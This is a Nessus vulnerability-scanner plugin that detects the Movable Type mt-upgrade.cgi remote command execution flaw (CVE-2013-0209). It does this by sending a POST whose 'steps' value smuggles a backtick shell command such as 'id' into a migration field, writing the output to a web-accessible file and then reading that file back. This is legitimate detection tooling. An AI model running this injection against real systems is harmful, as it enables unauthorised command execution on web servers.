#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(64096);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2016/05/20 14:12:06 $");

  script_cve_id("CVE-2013-0209");
  script_bugtraq_id(57490);
  script_osvdb_id(89322);  # 89321 is for a sql injection in the same script
  script_xref(name:"EDB-ID", value:"24321");

  script_name(english:"Movable Type mt-upgrade.cgi Remote Command Execution");
  script_summary(english:"Attempts to execute arbitrary commands");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A blog running on the remote web server is affected by a command
execution vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The Movable Type install hosted on the remote web server is affected by
a remote command execution vulnerability because the 'lib/MT/Upgrade.pm'
file used in mt-upgrade.cgi script fails to verify authentication for
requests used in database migration functions.  This could allow an
unauthenticated, remote attacker to form a specially crafted request and
inject arbitrary commands, which could execute with the privileges of
the web server user.  An attacker could also utilize this vulnerability
to execute arbitrary code on the remote host. 

The application is also reportedly affected by a SQL injection
vulnerability in mt-upgrade.cgi; however, Nessus has not tested for this
issue."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.sec-1.com/blog/?p=402");
  script_set_attribute(attribute:"see_also", value:"http://www.movabletype.org/2013/01/movable_type_438_patch.html");
  script_set_attribute(
    attribute:"solution",
    value:
"Upgrade to version 5.0 or later, or apply the patch in the referenced
URL for version 4.38."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Movable Type 4.2x, 4.3x Web Upgrade Remote Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/01/07");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/01/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/01/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:sixapart:movable_type");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("movabletype_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/movabletype");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

port = get_http_port(default:80);

install = get_install_from_kb(
  appname:"movabletype",
  port:port,
  exit_on_fail:TRUE
);

dir = install["dir"];
install_url = build_url(qs:dir, port:port);
vuln = FALSE;

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';
  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask";


# Verify that mt-upgrade.cgi is accessible
url = "/mt-upgrade.cgi";
res = http_send_recv3(
  method       : "GET",
  item         : dir + url,
  port         : port,
  exit_on_fail : TRUE
);

if ("<title>Upgrade Check | Movable Type" >!< res[2]) exit(0, "The Movable Type script 'mt-upgrade.cgi' is not accessible at " + install_url + url);

token = (SCRIPT_NAME - ".nasl") + "-" + unixtime() + ".txt";

foreach cmd (cmds)
{
  # define attack payloads
  if (cmd == 'id')
  {
     payload = "__mode=run_actions&installing=1&steps=[[" +
    '"core_drop_meta_for_table","class","`{ ' +cmd+'; pwd; }>' +token+ '`"]]';
  }
  else
  {
    payload = "__mode=run_actions&installing=1&steps=[[" +
    '"core_drop_meta_for_table","class","`' +cmd+ '>' +token+
     '%26%26dir>>' +token+ '`"]]';
  }

  payload = urlencode(
    str        : payload,
    unreserved : 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~-+$=[]&"%{}',
    case_type  : HEX_UPPERCASE
  );

  # Send POST request to execute commands & save the output
  res = http_send_recv3(
    port        : port,
    method      : "POST",
    item        : dir + url,
    data        : payload,
    add_headers :make_array("Content-Type","application/x-www-form-urlencoded"),
    exit_on_fail: TRUE
  );
  exp_request = http_last_sent_request();

  # Try accessing the file we created
  res2 = http_send_recv3(
    method       : "GET",
    item         : dir + "/" + token,
    port         : port,
    exit_on_fail : TRUE
  );
  output = res2[2];

  if (egrep(pattern:cmd_pats[cmd], string:output))
  {
    vuln = TRUE;
    get_up_path = "" + token;

    # Extract path for reporting
    if (cmd == 'id')
    {
      get_path = strstr(output, "/");
      get_up_path = chomp(get_path) + "/" + token;
      output = strstr(output, "uid") - get_path;
    }
    else
    {
      get_path = strstr(output, "Volume in drive");
      output = strstr(output, "Windows IP") - get_path;
      get_dir = egrep(pattern:"Directory of (.+)", string:get_path);
      if(!isnull(get_dir))
         get_up_path = chomp((get_dir - " Directory of ")) + '\\' + token;
    }
    break;
  }
}

if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, "Movable Type", install_url);

if (report_verbosity > 0)
{
  snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);

  report =
    '\nNessus was able to verify the issue exists using the following request :' +
     '\n' +
     '\n' + install_url + '/' + token +
     '\n' +
     '\nNote: This file has not been removed by Nessus and will need to be' +
     '\nmanually deleted (' + get_up_path + ').' +
     '\n';
  if (report_verbosity > 1)
  {
    report +=
      '\nThis file was uploaded using the following request :' +
      '\n' +
      '\n' + snip +
      '\n' + exp_request +
      '\n' + snip +
      '\n' +
      '\n' + 'The file uploaded by Nessus executed the command "'+cmd+ '"' +
      '\nwhich produced the following output :' +
      '\n' +
      '\n' + snip +
      '\n' + chomp(output) +
      '\n' + snip +
      '\n';
  }
  security_hole(port:port, extra:report);
}
else security_hole(port);
